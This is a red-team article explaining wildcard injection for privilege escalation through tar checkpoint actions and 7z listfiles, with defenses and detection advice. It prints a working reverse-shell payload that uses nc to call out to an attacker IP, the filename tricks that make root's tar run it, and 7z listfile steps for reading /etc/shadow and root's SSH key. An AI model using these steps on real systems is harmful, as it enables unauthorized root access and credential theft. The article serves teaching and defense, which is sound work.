---
title: "Wildcard Injection — From Tar Checkpoint Actions to 7z Listfiles"
description: "Wildcard injection is a class of privilege escalation that abuses the way shells expand glob patterns before executing a command. When a root-owned script uses * in a shell command, the filenames in the current directory become arguments to that command — including filenames crafted to look like options. This article covers three variants: tar checkpoint actions, 7z listfile injection, and the symlink-plus-listfile combination that bypasses both -- and -snl."
date: 2026-10-28
type: "Technique · Privilege Escalation"
category: "Red Team"
difficulty: "Intermediate"
readingTime: 16
tags: [wildcard-injection, tar, 7zip, privilege-escalation, argument-injection, cwe-78, cwe-73]
draft: false
---

## The premise

A shell command like `tar cf backup.tar *` looks safe. The asterisk is expanded by the shell before `tar` sees it, and each filename in the current directory becomes an argument. If the directory contains only files the operator created, the command behaves as expected. If the directory contains files that an attacker can create, the command becomes an extension of the attacker's will.

This is wildcard injection. It exploits the shell's glob expansion, not the tool's parsing. The tool receives arguments that look legitimate, and only the shell knows they came from filenames.

The class has been documented for years — the classic writeup is the `--checkpoint-action` abuse in tar, and every subsequent variant builds on the same principle. The core idea: if a filename can be crafted to look like an option, it will be treated as one.

This article covers three variants:

- **Tar checkpoint actions.** The `--checkpoint-action=exec=shell.sh` flag makes tar execute an arbitrary command at a checkpoint. If an attacker can create a file with that name, they can control tar's behavior.
- **7z listfiles.** The `@filename` prefix tells 7z to read the referenced file as a list of files to include. Combined with a symlink, this becomes an arbitrary read primitive.
- **Symlink + listfile combination.** When `--` and `-snl` flags are present (blocking argument injection and symlink following respectively), the `@` prefix bypasses both by making 7z read the list and then follow the symlink itself.

For the full assessment that used the 7z variant, see: **[Blind SQLi to Root — Laravel Admin, Monit Credentials and 7z Wildcard Injection →](/projects/blind-sqli-laravel-admin-to-root)**.

## Part One — How wildcard expansion works

The shell performs glob expansion before executing a command. When the shell encounters `*` in an unquoted argument, it is replaced with a sorted list of matching filenames in the current directory. The command receives those filenames as if the user had typed them individually.

```
$ ls
-a.txt
-c.txt
normal.txt

$ tar cf backup.tar *
```

What tar actually receives:

```
tar cf backup.tar -a.txt -c.txt normal.txt
```

The `-a.txt` and `-c.txt` are interpreted by tar as options, not files. This is the root of the problem: **the shell does not distinguish between filenames and options**. If a filename starts with `-`, the tool will see an option.

The standard defenses:

- **`./` prefix:** `tar cf backup.tar ./*` forces all arguments to start with `./`, which no option accepts. This is the primary defense.
- **`--` separator:** `tar cf backup.tar -- *` tells the tool that everything after `--` is a positional argument, not an option. This blocks argument injection.
- **`find -exec` or `xargs` with `-0`:** avoids shell expansion entirely.

The first defense (`./`) is preferable when possible. The second (`--`) only protects against argument injection, not against tools that accept positional arguments that influence their behavior — as the 7z listfile case demonstrates.

## Part Two — Tar checkpoint actions

`tar` supports a `--checkpoint` mechanism intended for long operations: every N records processed, tar executes an action. One of those actions is `exec`, which runs an arbitrary command.

```
--checkpoint=1 --checkpoint-action=exec=shell.sh
```

That sequence tells tar to execute `shell.sh` every 1 record. The command runs with the privileges of the tar process — which, in a privilege escalation scenario, means root.

To exploit this through wildcard injection, an attacker creates two files in the directory the root-owned tar command operates on:

```bash
# File 1: --checkpoint=1
echo "" > --checkpoint=1

# File 2: --checkpoint-action=exec=shell.sh
echo "" > "--checkpoint-action=exec=shell.sh"

# File 3: shell.sh — the payload
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.187 21 >/tmp/f' > shell.sh
```

When the root-owned script runs `tar cf /opt/backups/website.tar *`, the shell expands `*` to include these three files. Tar sees:

```
tar cf /opt/backups/website.tar --checkpoint=1 --checkpoint-action=exec=shell.sh shell.sh
```

The checkpoint mechanism fires, tar executes `shell.sh`, and the shell connects back to the attacker's listener:

```
$ penelope -p 21
[+] Connection from 10.129.80.169
root@usage:~#
```

The exploit is trivial once the preconditions are met. The only requirement is that the attacker can create files in the directory that the root-owned tar command operates on.

**Defense:** the root-owned script must use `tar cf backup.tar ./*` or `tar cf backup.tar -- *` (with the caveat that `--` alone does not block all variants, see Part Four). Modern tar versions have also restricted the `--checkpoint-action=exec` mechanism, but older versions remain exploitable.

## Part Three — 7z listfiles and symlinks

The 7z binary accepts an `@` prefix on an argument to indicate a **listfile**: a text file whose contents are interpreted as a list of files to include in the archive.

```
7za a backup.zip @list.txt
```

In this case, 7z reads `list.txt` and uses its content as the file list. This is a legitimate feature for including hundreds of files without specifying them all on the command line.

The wildcard injection abuses this: if the root-owned command uses `*` and the attacker can create a file named `@list.txt`, 7z will read the attacker-controlled file as a list of files to archive.

The simpler variant:

```bash
echo "/etc/shadow" > lista.txt
touch -- '@lista.txt'
```

When the root-owned script runs `7za a backup.zip *`, the shell expands `*` to include `@lista.txt`, and 7z interprets it as a listfile. `lista.txt` is read, and `/etc/shadow` is included in the archive — even though the archive process runs as root and the attacker could not read `/etc/shadow` directly.

**Defense:** the same as for tar — use `./` prefix, or restrict the directory that the wildcard operates on to files the attacker cannot create. Also ensure 7z is configured with `-i@` (pipe-only listfile input) if available, or use `7z a backup.zip $(ls | grep -v '^@')`.

## Part Four — When `--` and `-snl` are present

The 7z invocation in one assessment included two deliberate defenses:

```
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
```

- **`--`** blocks argument injection (files starting with `-` are treated as positional).
- **`-snl`** prevents 7z from storing symbolic links as links — it dereferences them.

At first glance, this should be safe. But there is still an attack path.

The `--` blocks filenames starting with `-` from being interpreted as options. It does not block filenames that 7z interprets as listfiles, because the `@` prefix is not an option — it is a positional argument that triggers listfile behavior.

The `-snl` blocks the classic symlink attack: create `root.txt` as a symlink to `/etc/shadow`, and 7z stores the symlink in the archive without following it. When extracted, the symlink still points to `/etc/shadow`, but the file's content is not in the archive.

However, `-snl` does not apply to files read through `@`. If a listfile points to a symlink, 7z follows the symlink to read the target's content — because the listfile processing bypasses the symlink-as-link logic.

The combined attack:

```bash
# Step 1: create a listfile that contains the path to the target
echo "/root/.ssh/id_rsa" > lista.txt

# Step 2: create a file named @lista.txt so 7z reads lista.txt as a listfile
touch -- '@lista.txt'
```

When the root-owned script runs `7za a /var/backups/project.zip -tzip -snl -mmt -- *`:

- The shell expands `*` to include `@lista.txt` and `lista.txt`.
- `--` blocks any filename starting with `-` from being interpreted as an option (there are none in this case).
- `@lista.txt` tells 7z to read `lista.txt` as a listfile.
- `lista.txt` contains `/root/.ssh/id_rsa`.
- 7z reads `/root/.ssh/id_rsa` and includes its content in the archive.

The `-snl` flag does not apply because no symlink is being stored. The path in `lista.txt` is a direct reference to a file outside the working directory. 7z follows it as a normal file inclusion.

Extracting the archive reveals `/root/.ssh/id_rsa` on the attacker's machine.

**Defense:** for the `-snl` variant, the only reliable defense is to not let the attacker control the directory that `*` operates on. If the directory is writable by the attacker, the `@` prefix will always be available as an attack vector. The `./` prefix does not help — `@./lista.txt` would still be interpreted as a listfile, though in practice filenames starting with `@` are unusual and would stand out.

The most robust defense is to rewrite the script so that 7z does not receive filenames from the current directory. Use `find` to build the file list, pass it through a pipe, and use `-i@<pipe>` to prevent filesystem-controlled listfiles:

```bash
find /var/www/html -maxdepth 1 -type f -print0 | \
  7za a /var/backups/project.zip -tzip -snl -mmt -i@/dev/stdin
```

The `-i@/dev/stdin` makes 7z read the file list from stdin, which the attacker cannot influence.

## Part Five — Why the password appears in `pspy`

In one of the assessments (a variant where the backup script stored a password in a variable), the tester noticed that a `pspy` capture revealed the password in plaintext:

```
CMD: UID=0 PID=1234 | 7za a /opt/backups/backup.zip -pWildCardsGoingWild -tzip *.zip
```

Two things are happening here.

**First, the shell expands the variable before execution.** When bash runs `7za a backup.zip -p$password ...`, the value of `$password` is substituted into the argument before the process is created. The process that 7z executes has the password as part of its command line, visible to anyone who can read `/proc/<pid>/cmdline`.

**Second, `pspy` was able to capture the command because the process lived long enough.** With an empty uploads directory, `7z` completes in milliseconds — too fast for `pspy` to sample. When the tester created additional files (symlinks, listfiles, or just extra entries), the operation took longer, and `pspy` captured the command during that window.

The key insight: **passing credentials as command-line arguments is always insecure**, regardless of the wildcard abuse. The password is visible in `ps`, `/proc/<pid>/cmdline`, and any process monitoring tool. The wildcard injection made it visible faster, but the underlying practice was already a leak.

**Defense:** use environment variables or a configuration file for credentials. Never pass a password with `-p$password` on a command line. If the tool requires it on the command line, wrap the invocation in a process that reads the password from a file and passes it through a file descriptor rather than an argument.

## Part Six — Detection

Wildcard injection is subtle because the individual commands are legitimate and the filenames are ordinary at the filesystem layer. Detection requires correlating filenames with command executions.

**Detections that work:**

- **Filenames starting with `-` or `@` in directories a root process operates on.** A file called `--checkpoint=1` or `@lista.txt` in `/var/www/html` is a strong indicator.
- **Unexpected invocations of shell interpreters or reverse-shell patterns** spawned from `tar`, `7z`, or similar archive tools. `pspy` or an audit rule that monitors `execve` will show the pattern.
- **Archives that contain files outside their expected scope.** A backup of `/var/www/html` that includes `/etc/shadow` or `/root/.ssh/id_rsa` is anomalous, and monitoring archive content is feasible.
- **Symlinks in directories a root process operates on** whose target is outside the directory tree. A symlink from `/var/www/html/list.txt` to `/etc/shadow` is unusual and worth alerting.

**Detections that do not work well:**

- **Watching for specific commands in the wildcard.** The attacker controls the filenames, and can vary them. A rule that flags `--checkpoint-action=exec` will miss variants like `--to-command=`.
- **Content-based detection on the archive.** By the time the archive is built, the damage is done. The extraction is the disclosure step, and it can happen later, off-system, or through a different tool.

**The most effective defense is at the script level.** If the root-owned script uses `./` or `find`, the wildcard cannot be influenced by filenames. If the script restricts the directory to files that the attacker cannot create, the attack surface is removed.

## Takeaway

Wildcard injection is a class of privilege escalation that does not exploit any tool's parsing logic. It exploits the fact that shells expand glob patterns before executing commands, and that filenames and options are indistinguishable at that layer. The tool receives what the shell gives it, and the shell does not know or care what the tool means by each argument.

The defenses are mechanical: `./` prefix, `--` separator, `find` instead of shell expansion. None of them are exotic. The reason wildcard injection remains common is not that the defenses are hard, but that they require awareness of a failure mode that does not appear in normal operation. A script that works fine in a test environment will fail catastrophically in a production environment where an attacker has prepared the directory.

For the full assessment that used the 7z variant against a real target, see: **[Blind SQLi to Root — Laravel Admin, Monit Credentials and 7z Wildcard Injection →](/projects/blind-sqli-laravel-admin-to-root)**. The chain demonstrates how wildcard injection combines with an unauthenticated SQL injection to convert a "backup" sudoers rule into arbitrary file read as root.

The general lesson, applicable across the whole class of "restricted sudoers" grants: **a sudoers rule that grants a command that operates on attacker-controllable files is a grant of whatever that command can do with attacker-controlled input. It is never "just" the command.**
